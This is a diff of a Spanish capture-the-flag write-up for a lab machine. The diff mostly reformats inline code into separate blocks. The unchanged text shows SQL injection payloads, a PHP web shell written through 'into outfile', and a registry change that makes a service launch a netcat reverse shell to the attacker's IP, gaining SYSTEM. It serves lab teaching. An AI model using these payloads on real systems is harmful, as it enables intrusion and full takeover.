@@ -68,7 +68,11 @@ Lanzamos un web scan con nmap.
 
 nmap --script http-enum -p80 10.10.10.167 -oN webScan
 
-Nos detecta la routa `admin`
+Nos detecta la routa 
+```bash
+ admin 
+```
+
 
 #### Fuzzing con WFuzz {-}
 
@@ -76,7 +80,15 @@ Nos detecta la routa `admin`
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.167/FUZZ
 ```
 
-Encontramos las routas `uploads`, `admin`
+Encontramos las routas 
+```bash
+ uploads 
+```
+, 
+```bash
+ admin 
+```
+
 
 ### Analyzando la web con Firefox {-}
 
@@ -125,7 +137,11 @@ Ya podemos navegar de manera normal.
 
 Vemos una pagina con productos y un input para buscar productos. Si escribimos un producto, aparece una tabla con un titulo **id**.
 
-Probamos poner un apostrofe `'` en el input de busqueda y nos sale un error SQL `Error SQLSTATE[42000] Syntax error or access violation You have an error in your SQL
+Probamos poner un apostrofe 
+```bash
+ ' 
+```
+ en el input de busqueda y nos sale un error SQL `Error SQLSTATE[42000] Syntax error or access violation You have an error in your SQL
 syntax, check the manual that corresponds to your MariaDB server version for the right syntax to use near "'" at line 1`
 ## Vulnerability Assessment {-}
 
@@ -180,7 +196,11 @@ if __name__ == '__main__':
 
 ```
 
-si lanzamos el script con `rlwrap python3 sqli_injection.py` y a la entrada payload le ponemos el apostrofe, podemos ver el error. Ya podemos enumerar
+si lanzamos el script con 
+```bash
+ rlwrap python3 sqli_injection.py 
+```
+ y a la entrada payload le ponemos el apostrofe, podemos ver el error. Ya podemos enumerar
 la base de datos.
 
 1. Miramos cuantas columnas hay
@@ -193,7 +213,11 @@ la base de datos.
     [+] Payload : ' order by 6-- -
     ```
 
-    Al `' order by 6-- -` nos sale No product Found, ya sabemos que hay 6 columnas
+    Al 
+```bash
+ ' order by 6-- - 
+```
+ nos sale No product Found, ya sabemos que hay 6 columnas
 
 1. Aplicamos el union select
 
@@ -223,7 +247,11 @@ la base de datos.
 
     Parece que no podemos leer ficheros del systema.
 
-    > [ ! ] NOTAS: el hexadecimal se hace con el comando `echo "C:\Windows\System32\drivers\etc\hosts" | tr -d '\n' | xxd -ps | xargs | tr -d ' '`
+    > [ ! ] NOTAS: el hexadecimal se hace con el comando 
+```bash
+ echo "C:\Windows\System32\drivers\etc\hosts" | tr -d '\n' | xxd -ps | xargs | tr -d ' ' 
+```
+
 
 1. Enumeramos las tablas existentes de la base de datos
 
@@ -283,8 +311,20 @@ poder ganar accesso al systema.
 ### Ganando accesso con SQL Injection {-}
 
 Lo que vamos a intentar hacer, es escribir en un fichero usando la **SQLI**. Esto se puede hacer con el commando
-`into outfile`. Como savemos que la web es un IIS la routa por defecto de windows para hostear las webs de IIS es
-`C:\inetpub\wwwroot` y hemos encontrado una routa `/uploads` intentamos ver si podemos escribir nuevos ficheros.
+
+```bash
+ into outfile 
+```
+. Como savemos que la web es un IIS la routa por defecto de windows para hostear las webs de IIS es
+
+```bash
+ C:\inetpub\wwwroot 
+```
+ y hemos encontrado una routa 
+```bash
+ /uploads 
+```
+ intentamos ver si podemos escribir nuevos ficheros.
 
 ```bash
 rlwrap python3 sqli_injection.py
@@ -292,14 +332,22 @@ rlwrap python3 sqli_injection.py
 [+] Payload : ' union select 1,2,"test",4,5,6 into outfile "C:\\inetpub\\wwwroot\\uploads\\test.txt-- -
 ```
 
-Si vamos a la url `http://10.10.10.167/uploads/test.txt` vemos el fichero creado. Intentamos injectar codigo malicioso
+Si vamos a la url 
+```bash
+ http://10.10.10.167/uploads/test.txt 
+```
+ vemos el fichero creado. Intentamos injectar codigo malicioso
 
 ```bash
 rlwrap python3 sqli_injection.py
 [+] Payload : ' union select 1,2,"<?php echo \"<pre>\" . shell_exec($_REQUEST['cmd']) . \"</pre>\"; ?>",4,5,6 into outfile "C:\inetpub\wwwroot\uploads\s4vishell.php-- -
 ```
 
-Ya podemos comprobar que podemos ejecutar comandos en la url `http://10.10.10.167/uploads/s4vishell.php?cmd=whoami`. 
+Ya podemos comprobar que podemos ejecutar comandos en la url 
+```bash
+ http://10.10.10.167/uploads/s4vishell.php?cmd=whoami 
+```
+. 
 
 Vamos a por ganar accesso al systema
 
@@ -490,7 +538,11 @@ reg query "HKLM\system\currentcontrolset\services\seclogon"
 reg add "HKLM\system\currentcontrolset\services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.15 443" /f
 ```
 
-Ya podemos comprobar con el commando `reg query "HKLM\system\currentcontrolset\services\seclogon"` que el ImagePath a sido cambiado.
+Ya podemos comprobar con el commando 
+```bash
+ reg query "HKLM\system\currentcontrolset\services\seclogon" 
+```
+ que el ImagePath a sido cambiado.
 
 1. Nos ponemos en escucha por el puerto 443
 
@@ -504,4 +556,8 @@ Ya podemos comprobar con el commando `reg query "HKLM\system\currentcontrolset\s
     sc start seclogon
     ```
 
-ya hemos ganado accesso al systema como `nt authority\system` y podemos leer la flag.
+ya hemos ganado accesso al systema como 
+```bash
+ nt authority\system 
+```
+ y podemos leer la flag.
